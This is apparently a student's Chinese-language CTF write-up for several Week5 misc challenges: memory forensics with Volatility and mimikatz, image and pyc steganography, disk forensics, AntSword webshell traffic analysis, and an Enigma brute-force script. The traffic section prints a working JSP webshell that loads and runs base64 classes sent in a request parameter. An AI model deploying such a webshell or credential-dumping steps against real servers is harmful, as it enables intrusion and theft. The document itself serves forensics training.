vol3更新使用：https://r0fus0d.blog.ffffffff0x.com/post/memory-forensics/#%E4%BD%BF%E7%94%A8-1

https://hasegawaazusa.github.io/vol3-note.html



遇到的问题是安装相关依赖项时特别是pycryptodome，这个需要使用pip2，而系统默认的pip3无法安装，尝试了其他crypto依赖项都不行，于是我还是决定一项一项解决，想办法安装pip2.

在现在的kali上pip3 -V

![image-20240308165533952](../typora-user-images/image-20240308165533952.png)

而pip2 -V

![image-20240308165550043](../typora-user-images/image-20240308165550043.png)

然后我就又看博客  [Kali linux安装pip2与pip3](https://blog.csdn.net/Fly_hps/article/details/120650837)

按照博客的结果截图，pip2 -V  该有响应了，可事实是我这

![img](https://img-blog.csdnimg.cn/20211008141341135.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARkx5X-m5j-eoi-S4h-mHjA==,size_20,color_FFFFFF,t_70,g_se,x_16)

上面这个是博客的结果，我的在运行pip2 -V以前前面安装内容和它几乎一样，唯独不同的是我的最后显示wheel-0.37.1

然后询问GPT，没想到还真行

![image-20240308165859876](../typora-user-images/image-20240308165859876.png)

前面的~/.local/bin/pip2  输入后

![image-20240308165936406](../typora-user-images/image-20240308165936406.png)

可能就是没有添加环境变量，但是我按照GPT的添加，结果还是失败，不能pip2 -V

这里我不多想了，就先这样

总之，我索性就这样安装了依赖项 pycryptodome

```bash
~/.local/bin/pip2 install pycryptodome -i https://pypi.tuna.tsinghua.edu.cn/simple
```

然后跟着博客安装volatility

最终没有报错，安装成功，也能够正常使用，继续做这道题

首先是识别操作系统

![image-20240308170234579](../typora-user-images/image-20240308170234579.png)

一般用Suggested Profile(s)的第一个结果作为值

第二是查看桌面文件

![image-20240308170423710](../typora-user-images/image-20240308170423710.png)

查看内存进程列表

```bash
volatility -f ./dycqz.raw --profile=Win7SP1x64 pslist
```

![image-20240308170611179](../typora-user-images/image-20240308170611179.png)

查看notepad进程

```
volatility -f ./dycqz.raw --profile=Win7SP1x64 editbox
```

![image-20240308170722468](../typora-user-images/image-20240308170722468.png)

得到一串密文，我们进行base91解码

![image-20240308170907480](../typora-user-images/image-20240308170907480.png)

即可得到flag





​		我看官方题解使用volatility是在windows上使用的，确实方便说实话，因为我在网上看到的大部分教程也都是对windows上使用volatility安装解释的比较清楚，而kali上很少，这里我是比较犟的，搞了好长时间在kali上装volatility

​		后面再做的话还是在windows上使用吧，毕竟这种取证题给的文件也都比较大，一般就直接下载到windows系统上了，并且也方便管理，kali上添加环境变量我不熟悉，而且配置麻烦，这一点不能解决，每次都要把分析的镜像文件放在vol.py文件夹下，或者加一堆前缀......



[【技术分享】电子取证技术之实战Volatility工具](https://www.anquanke.com/post/id/86036)

彻底懵了，添加不好环境变量







## Week5 Web

### 第一题 Unserialize Again

<img src="../typora-user-images/image-20240312181458536.png" alt="image-20240312181458536" style="zoom:67%;" />



















## Week5 Misc

### 第一题 隐秘的图片

<img src="../typora-user-images/image-20240312181627543.png" alt="image-20240312181627543" style="zoom: 67%;" />

题目给了两个png图片

看表面的话是两张二维码？

第一张图是完整的，拿手机扫描后发现内容是nothing is here but where is flag

​		flag可能在第二 张图，但是第二张图片不完整，所以这两张图片可能需要重合或者是运算异或？

​		可以尝试使用stegsolve进行xor运算

<img src="../typora-user-images/image-20240312182548605.png" alt="image-20240312182548605" style="zoom:50%;" />

扫描异或的结果即可得到flag

flag{x0r_1m4ge_w1ll_g0t_fl4ggg_3394e4ecbb53}

参考博客 [CTF题目记录2（图片隐写）](https://blog.csdn.net/qq_39679772/article/details/105974659)



### 第二题 ezhard

<img src="../typora-user-images/image-20240312182743221.png" alt="image-20240312182743221" style="zoom:50%;" />

第一次磁盘取证

我还好奇需要什么工具来着，原来winhex就可以直接进行取证查看

[参考博客 宸极实验室『CTF』常见的 Windows 硬盘取证](https://zhuanlan.zhihu.com/p/642060682)

需要知道的是 磁盘取证一般分为加密磁盘取证和未加密磁盘取证

这道题是未加密磁盘取证，加密磁盘取证主要考察的点是如何识别加密软件及获取密码

我们使用winhex打开题目附件

然后在专业工具--将镜像文件转换为磁盘，即可查看磁盘内部文件，如下

![image-20240312192733933](../typora-user-images/image-20240312192733933.png)

在flag文件中并没有flag，再打开hint.png查看

<img src="../typora-user-images/image-20240312192824471.png" alt="image-20240312192824471" style="zoom:50%;" />

得到flag





### 第三题 新建Python文件

<img src="../typora-user-images/image-20240312193056510.png" alt="image-20240312193056510" style="zoom:50%;" />

在CTF Wiki中有介绍，也是一类题目 https://ctf-wiki.org/misc/other/pyc/

现在在线网址进行pyc反编译得到如下结果

```python
# uncompyle6 version 3.5.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.7.2 (default, Dec 29 2018, 06:19:36) 
# [GCC 7.3.0]
# Embedded file name: flag.py
# Compiled at: 2023-10-04 20:18:22
# Size of source mod 2**32: 450 bytes
"""Example carrier file to embed our payload in.
"""
from math import sqrt

def fib_v1(n):
    if n == 0 or n == 1:
        return n
    else:
        return fib_v1(n - 1) + fib_v1(n - 2)


def fib_v2(n):
    if n == 0 or n == 1:
        return n
    else:
        return int(((1 + sqrt(5)) ** n - (1 - sqrt(5)) ** n) / (2 ** n * sqrt(5)))


def main():
    result1 = fib_v1(12)
    result2 = fib_v2(12)
    print(result1)
    print(result2)


if __name__ == '__main__':
    main()
```

？？？是一个计算斐波那契数的程序？

考点是pyc剑龙隐写



[关于隐写 CTF-杂项-隐写](https://www.qingdenggujiu.com/archives/130)



下载工具进行解决，可以直接获得flag

![image-20240312204541964](../typora-user-images/image-20240312204541964.png)

注：工具对python版本要求比较严格，最好是3.6的

这里我conda新建了一个3.6的python虚拟环境，然乎发现在anaconda终端进行切换目录时无法cd E:\ 转换盘目录，   然后发现需要直接E: 跳到根目录，然后再cd到指定目录就行了。

https://blog.csdn.net/nanchifeng3190/article/details/86688614





### 第四题 BabyAntSword ***

<img src="../typora-user-images/image-20240312204914153.png" alt="image-20240312204914153" style="zoom:50%;" />

给了pcap的附件，是流量分析题目

蚁剑  webshell的连接工具 ，牵扯到webshell网页流量分析时，我们都应该去看看post请求方式的

![image-20240312211457668](../typora-user-images/image-20240312211457668.png)

发现有上传shell.war文件(很想知道为什么它知道上传文件是在这个标头下面)

题解上说这里应该可以看出来其实是tomcat弱口令部署war包GetShell的一个 流量。

没看懂

先照着做把war包解压

怎么把war包给保存起来呢，其内容的ASCII码形式应该是下面的

![image-20240313125832738](../typora-user-images/image-20240313125832738.png)

​		将这段ASCII码以二进制形式保存，更名为download.war，就是我们需要的文件，也就是上面POST请求上传的shell.war文件。

![image-20240313130147426](../typora-user-images/image-20240313130147426.png)

​		这个文件在这个流量包中，可以看到是在Data字段中的，我们可以右键-->导出分组字节流，然后保存新文件名为download.war。

![image-20240313130610430](../typora-user-images/image-20240313130610430.png)

META-INF文件夹中是版本信息，没什么用处。

主要看yesec.jsp文件是什么内容

```jsp
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

public byte[] base64Decode(String str) throws Exception {
    try {
        Class clazz = Class.forName("sun.misc.BASE64Decoder");
        return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
    } catch (Exception e) {
        Class clazz = Class.forName("java.util.Base64");
        Object decoder = clazz.getMethod("getDecoder").invoke(null);
        return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
    }
}

%>
<%
    String cls = request.getParameter("n3wst4r");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

​		这里我们可以看到Webshell密码为：n3wst4r

​		题解中写到这个密码也可在后续的请求包中得到，这里我没有找到。



​		蚁剑流量分析中，对于蚁剑响应流量的解密就是Base64解密即可，需要去掉响应首尾拼接的干扰字符。 



在wireshark中如何查找post请求 /yesec.jsp的流量包

要在Wireshark中查找特定的POST请求，您可以按照以下步骤进行操作：

1. 打开Wireshark并加载捕获文件。

2. 在过滤框中输入过滤条件来过滤出HTTP POST请求。您可以使用以下过滤器来查找特定的POST请求：

   ```
   http.request.method == "POST" && http.request.uri contains "/yesec.jsp"
   ```

   按下Enter键或单击过滤按钮以应用过滤器。

   Wireshark将仅显示包含POST方法和包含“/yesec.jsp”字符串的URI的HTTP请求。

   通过这种方式，您可以轻松地找到特定的POST请求并查看与该请求相关的流量包。

   

​		对于蚁剑请求流量的分析需要删掉首部前两个字符，例如在tcp.stream eq 39的请求中我们提取出参数：(它为什么知道是tcp.stream eq 39)？？

![image-20240314125604359](../typora-user-images/image-20240314125604359.png)

​		因为这里是POST请求 yesec.jsp文件，也就是刚才上传的shell.war文件中的内容，所以我们需要知道这里请求参数的信息。内容的话就是下面的那一长串，base64解密，记住蚁剑请求流量的分析需要删除首部前两个字符。并且这里我们也可以看到webshell的密码为 n3wst4r

解码部分内容如下：

![image-20240314130030812](../typora-user-images/image-20240314130030812.png)

这串指令是跳转到tomcat目录，执行env命令，后面有两个打印参数和当前目录pwd

执行env命令，我们可以从env中拿到Java版本

![image-20240314131416319](../typora-user-images/image-20240314131416319.png)

​		对图中的响应流量进行base64解密，我有点好奇题解是怎么知道要从T1BFTlN开始是base64字符串的。

​		[参照博客 浅谈蚁剑流量分析](https://zhuanlan.zhihu.com/p/666225827)

![image-20240314131624866](../typora-user-images/image-20240314131624866.png)

所以就是一个一个删除开头字符串解码测试即可，解码结果：

```http
OPENSSL_VERSION=1.1.0e-1
HOSTNAME=bd290627c5ce
LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib
HOME=/root
OLDPWD=/usr/local/tomcat
CATALINA_HOME=/usr/local/tomcat
TOMCAT_MAJOR=8
JAVA_VERSION=7u121
GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 713DA88BE50911535FE716F5208B0AB1D63011C7 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23
JAVA_DEBIAN_VERSION=7u121-2.6.8-2~deb8u1
PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TOMCAT_TGZ_URL=https://www.apache.org/dyn/closer.cgi?action=download&filename=tomcat/tomcat-8/v8.0.43/bin/apache-tomcat-8.0.43.tar.gz
LANG=C.UTF-8
TOMCAT_VERSION=8.0.43
TOMCAT_ASC_URL=https://www.apache.org/dist/tomcat/tomcat-8/v8.0.43/bin/apache-tomcat-8.0.43.tar.gz.asc
JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64/jre
PWD=/usr/local/tomcat
TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib
f5cd9
/usr/local/tomcat
0a25fbc1c5


```

我们可以看到java版本为**7u121**





wireshark使用的疑惑？

在Wireshark中，右键单击TCP流并选择"Follow TCP Stream"会将过滤器更改为选定流的过滤器，并且只会显示与该特定流相关的包。

这就导致，我的过滤器 

http.request.method==POST && http.request.uri contains "yesec" 

会变为

tcp.stream eq 39

但我要追踪这个流的下一个，，，我之前就是关闭窗口，然后把过滤器再填入

http.request.method==POST && http.request.uri contains "yesec" 

得出的结果再去找下一个流40，这样是很麻烦的，我也很好奇为什么wireshark这么设计不麻烦么，然后我发现，原来有一个快捷键在那

<img src="../typora-user-images/image-20240314134613972.png" alt="image-20240314134613972" style="zoom:67%;" />

可以在这点击上建或者下键来切换流，或者直接输入指定流.........

当然也可以把一组匹配过滤器的包保存下来，但是这样追踪流的时候会没有响应包，也还是不行，所以就直接点右下角这个挨着浏览即可。

![image-20240314134822150](../typora-user-images/image-20240314134822150.png)

所以浏览到流eq 43的时候，我们看到这里执行了cat /.secret 比较可疑，看看响应包

![image-20240314135006253](../typora-user-images/image-20240314135006253.png)

这应该就是flag后半部分了,即有

flag{n3wst4r_7u121_c5850a0c-dc03-1db2-4303-43d6fdf27985}





### 第五题 Easymem

<img src="../typora-user-images/image-20240314135519283.png" alt="image-20240314135519283" style="zoom:50%;" />

网盘下载速度飞慢

简单的取证

![image-20240314155122705](../typora-user-images/image-20240314155122705.png)

先获取信息，识别操作系统

Suggested Profile(s) : Win7SP1x64   用第一个就好

​		我也不知道小明把flag藏在哪里了，官方题解直接就说flag第一部分在ctf用户的密码，需要使用mimikatz插件读取

​		所以现在先安装这个插件

参考博客 

https://hcnote.cn/2024/01/22/9237.html

[内存取证-volatility工具的使用 （史上更全教程，更全命令）](https://blog.csdn.net/m0_68012373/article/details/127419463)

[volatility安装+插件安装（mimikatz）](https://blog.csdn.net/sbingmo/article/details/125719145)

[内存取证-Volatility安装使用以及一些CTF比赛题目](https://blog.csdn.net/weixin_44895005/article/details/123917324)

kali以前是自带volatility的，网上查询看是自从2020年起，就有呼声说volatility不在kali的软件包中了，kali官方好像没说什么，kali自带vol的版本可以试试2019版的。

https://github.com/jayXtownhz/LearnKali2019.4

[这里也找到相关线索了](https://www.cnblogs.com/M0urn/articles/17761218.html)，如果想好好使用的话，建议kali2019版本

[2019版安装](https://blog.csdn.net/m0_47643893/article/details/113531673)

<img src="../typora-user-images/image-20240317211542866.png" alt="image-20240317211542866" style="zoom:67%;" />

继续插件的安装

<img src="../typora-user-images/image-20240318190118455.png" alt="image-20240318190118455" style="zoom: 67%;" />

放在该目录下

使用时需要添加参数`--plugins=./volatility/plugins`

![image-20240318190713919](../typora-user-images/image-20240318190713919.png)

安装construct模块

![image-20240318192318379](../typora-user-images/image-20240318192318379.png)

身心俱疲，真是佛了，一堆问题，装不上依赖项construct

python3版本能装上，但是volatility用的确要python2，python2安装不管怎么样都会这么报错

果然，还是直接下载一个2019版的kali玩吧，新版kali装volatility一堆奇怪问题

![image-20240318194001918](../typora-user-images/image-20240318194001918.png)

网上随便找的一个，百度网盘速度感人，又找了一个有[kali镜像](https://renwole.com/archives/3012)的网址(希望别有后门)

直接idm下载了

​		中间还是出现了许多莫名奇妙的问题，不过都解决了，但是最让我蚌埠住的是2019.4的kali好像也没有volatility了，，，，，，裂开裂开裂开裂开

​		既然mimikatz问题解决了19版kali安装就先不管了，已经下好了一个镜像文件，以后用的着再说吧，不想再折腾这个了，主要还不是求那个自带volatility嘛......相关的插件安装下载也稳定，既然现在这些凑活能用，就先不安装了19版的了。





​		上面kali2019的安装放在一边，这里我又尝试在现在版本的kali上安装construct库，

​		参考GPT的回答

​		使用pip2安装这个库时会报错，这个错误通常是由于 `setup.py` 脚本中包含不兼容 Python 2 的选项而导致的。由于 Python 2 已经不再维护，一些 Python 2 的选项在较新版本的 pip 中可能不再受支持。

针对这个问题，你可以尝试以下几种解决方法：

1. **手动安装**：下载 `construct` 库的源代码，然后在解压后的文件夹中运行 `python setup.py install` 命令进行手动安装。
2. **指定版本**：尝试安装其他版本的 `construct` 库，例如 `construct==2.10.53` 或者 `construct==2.10.55`。
3. **Python 3**：如果可能的话，考虑在 Python 3 环境下运行程序，并使用 Python 3 版本的 pip 进行安装。
4. **寻求帮助**：在 `construct` 库的文档或社区中寻求帮助，看是否有其他用户遇到了相同的问题，并且能够提供解决方案。

​		无论哪种方法，请记得备份你的代码和环境，以免出现意外情况。

![image-20240319163708788](../typora-user-images/image-20240319163708788.png)

​		2肯定不行，都一样的结果，3的话不行，因为我的volatility是在py2环境下装的，4也查不到有效的

​		只能试试1了，GPT回答的大致意思让我感觉可能是我这个pip2版本比较新，python2的setup.py一些东西可能不支持了。

​		于是我直接去[pypi官方](https://pypi.org/project/construct/2.5.5/#files)把construct==2.5.5-reupload的包下载下来了,在其文件夹内

然后我这个kali有py2.7版本  于是命令 sudo python2 setup.py install

<img src="../typora-user-images/image-20240318192318379.png" alt="image-20240318192318379" style="zoom: 67%;" />

![image-20240319164411665](../typora-user-images/image-20240319164411665.png)

成功安装(和pip安装失败的情况对比一下)

然后再去volatility中使用mimikatz插件

```
vol.py --plugins=./volatility/plugins/ -f ../win.raw --profile=Win7SP1x64 mimikatz  
```

![image-20240319164543066](../typora-user-images/image-20240319164543066.png)

成功获取用户密码明文！

总之就是在这里需要使用mimikatz插件，而这个插件需要construct库的支持，但pip2安装问题一堆

最后曲线救国一下装上了construct库，可以使用mimikatz插件了！

获取第一部分flag{45a527fb-2f  





有基础操作看桌面文件

```
vol.py -f ../win.raw --profile=Win7SP1x64 filescan | grep 'Desk'  
```

![image-20240317211055396](../typora-user-images/image-20240317211055396.png)

可以直接看到flag2.txt可疑文件，那么如何查看其内容呢？

我们可以使用dumpfiles插件下载

[再一次查询volatility的使用指南](https://fov0813.gitee.io/2021/11/21/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7volatility/)

![image-20240317211830052](../typora-user-images/image-20240317211830052.png)

```
vol.py -f ../win.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ed627e0 -D ./
```

./表示导出到当前目录

查看flag2.txt

![image-20240317212258325](../typora-user-images/image-20240317212258325.png)

原来导出来的文件名这么奇怪，总之，打开文件之后可以发现这是flag的一部分

​    83-5032-1056-

![image-20240317212552079](../typora-user-images/image-20240317212552079.png)

还有一部分是在进程中，也可以将其导出

```
vol.py -f ../win.raw --profile=Win7SP1x64 memdump -p 1484 -D ../   
```

画图进程的话应该使用图片工具打开，这里我们使用GIMP打开文件

在kali上安装GIMP 

```
sudo apt install gimp gimp-help-en -y
```

这里有几个问题记录

​		一是关于GIMP这个软件，上网看评价挺不错的，都说是Linux上的PS，界面简洁，功能却和PS大差不差，相当牛的软件了；这道题解也是用这个软件进行宽度变化了，当然还进行了位移，这里宽度高度变化给人直观感受是图片确实变宽和高了，具体怎么做的，是直接拉伸还是什么的，这是我疑惑的，

​		还有一点是按照题解上那样对图片进行操作时，拖动宽度和高度条GIMP程序会崩溃关闭，拖动位移没有问题，高度宽度只能在右边点击增加或者输入增加，有点难受，不知道是特例还是怎么样，如果其他打开其他图片也是这种情况那就非常难受了。

这里写后续

<img src="../typora-user-images/image-20240318185236986.png" alt="image-20240318185236986" style="zoom:50%;" />

一阵捣鼓会出现这种情况，这里我也是疑惑的，为什么知道需要调整宽度高度啊，我可能是想不到的

反正这里看图发现是有flag3字样的只是图片需要翻转才行，和旋转还不一样，这里就直接截屏放在画图工具里翻转即可，如下

![image-20240318185553385](../typora-user-images/image-20240318185553385.png)

得到第三部分flag

0b949b63a947}



拼接得到flag{45a527fb-2f83-5032-1056-0b949b63a947}

windows下搞了个volatility在这  E:\LSoft\Anaconda\envs\myctf\Scripts\vol.exe

以后有空看看吧，在win下使用还是舒服些，不用移动那么大的镜像。







### 第六题 Enigma

<img src="../typora-user-images/image-20240314140312323.png" alt="image-20240314140312323" style="zoom:67%;" />

​		恩尼格玛密码机（德语：Enigma，又译哑谜机，或“谜”式密码机）是一种用于加密与解密文件的密码机。确切地说，恩尼格玛是对二战时期纳粹德国使用的一系列相似的转子机械加解密机器的统称，它包括了许多不同的型号，为密码学对称加密算法的流加密。

#### [CTF中那些脑洞大开的编码和加密](https://www.t00ls.com/articles-34578.html)

考点是EnigmaMachine爆破

题目代码

```python
from enigma.machine import EnigmaMachine

from secret import *



def enigma(m, _reflector, _rotors, _rs):

  machine = EnigmaMachine.from_key_sheet(

​      rotors=_rotors,

​      reflector=_reflector,

​      ring_settings=_rs,

​      plugboard_settings='')

  temp = machine.process_text(m)

  return temp.lower()



print(enigma(flag, reflector, rotors, [rs1,15,rs2]))

# uwdhwalkbuzwewhcaaepxnqsvfvkohskkspolrnswdfcbnn
```

函数接受四个参数：

- `m`：要加密或解密的消息。
- `_reflector`：反射器的设置。
- `_rotors`：转子的设置。
- `_rs`：环设置（也称为转子初始位置）。

未知的加密参数有反射器 reflector，转子的设置rotors还有rs1、rs2环设置。

大概了解一下这个类库就能知道这几个参数的取值范围，编写脚本爆破：

![image-20240314144056847](../typora-user-images/image-20240314144056847.png)

刚开始遇到的问题是，这个enigma包不知道怎么下载，是个什么包啊

然后问了问谷歌，在pypi.org上看了看，确定了是py-enigma这个包

因为有使用实例

![image-20240314144331084](../typora-user-images/image-20240314144331084.png)

https://pypi.org/project/py-enigma/

编写程序

```python
from enigma.machine import EnigmaMachine

reflectors = ['B-Thin', 'C-Thin']

rotors = ['I', 'II', 'III', 'IV', 'V', 'VI', 'VII', 'VIII']

for r1, r2, r3 in [(r1, r2, r3) for r1 in rotors for r2 in rotors for r3 in rotors]:

  for r in reflectors:

    for a, b in [(a, b) for a in range(1, 26) for b in range(1, 26)]:

      machine = EnigmaMachine.from_key_sheet(

        rotors=' '.join([r1, r2, r3]),

        reflector=r,

        ring_settings=[a, 15, b],

        plugboard_settings=''

      )

      temp = machine.process_text('uwdhwalkbuzwewhcaaepxnqsvfvkohskkspolrnswdfcbnn')

      if temp.startswith("FLAG"):

        print(temp, r1, r2, r3, r)

        break


```

运行结果

FLAGISENIGMAISSOOOINTERESTINGCRYPTODOYOUTHINKSO II IV VII C-Thin
FLAGLQYFHBOXHCWIEISTADBCTOXDZYDZFUQXZXHVXLOSCTF IV I I B-Thin
FLAGKZKVLXASDLYAQUYALLIWAYOTSEGXOXIQVPQASWLYGET IV I II B-Thin
FLAGLWNOARLSWCGBFOKBKKSCTUELVNJTTHDTDGBFXVYKUMO V V I B-Thin

能跑出四个结果，看官方应该是取了第一个结果的，不知道为什么,因为有enigmais这个关键词吧

所以

flag{ENIGMAISSOOOINTERESTINGCRYPTODOYOUTHINKSO}



















